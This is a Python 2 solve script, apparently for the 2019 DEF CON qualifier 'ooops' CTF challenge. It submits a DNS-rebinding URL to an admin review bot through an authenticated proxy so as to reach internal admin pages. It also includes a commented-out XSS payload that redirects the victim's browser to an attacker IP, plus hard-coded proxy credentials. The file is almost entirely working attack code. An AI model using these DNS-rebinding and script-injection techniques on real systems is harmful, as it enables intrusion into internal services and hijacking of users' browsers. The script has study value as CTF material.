#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import requests
import base64

proxies = {'http': 'http://ooops.quals2019.oooverflow.io:8080'}

creds = 'OnlyOne:Overflow'

creds = base64.b64encode(creds)

base_url = 'http://oooverflow.io'
review_path = '/ooops/d35fs23hu73ds/reviewed.html'
get_data_path = '/ooops/d35fs23hu73ds/review.html'

headers = {
    'Proxy-Authorization': 'Basic {}'.format(creds),
    'Host': 'oooverflow.io'
}

#my_url = 'http://134.209.72.44/foo.html'
my_url = 'http://86d1482c.0a000905.rbndr.us:5000/m2.html'
#my_reason = 'because its dope <img src="http://134.209.72.44/image.png"><script>window.location.replace("http://134.209.72.44/image.png?hello");</script>'
my_reason = 'irrelevant'

data = {
    'url': my_url,
    'reason': my_reason,
}


def get_captcha():
    status = 0
    while status != 200:
        print 'zzz'
        time.sleep(2)
        r = requests.get(base_url + get_data_path, headers=headers, proxies=proxies)
        status = r.status_code
    captcha = r.content.split('"captcha" src="')[1].split('"')[0]
    print captcha
    status = 0
    while status != 200:
        print 'zzz...'
        time.sleep(2)
        r = requests.get(base_url + captcha, headers=headers, proxies=proxies)
        status = r.status_code
    f = open('captcha.png', 'w')
    f.write(r.content)
    f.close()
    return captcha.split('/')[-1]


def make_report():
    #data['captcha_id'] = get_captcha()
    #data['captcha_guess'] = raw_input('captcha: ')
    #print data
    r = requests.post(base_url+review_path, data=data, headers=headers, proxies=proxies)
    print r.content


if __name__ == "__main__":
    make_report()
    # r = requests.get('http://10.0.1.71:5000/admin/view/62', headers=headers, proxies=proxies)
    # print r.content
    # r = requests.get(base_url + 'admin/view', headers=headers, proxies=proxies)
    # print r.content
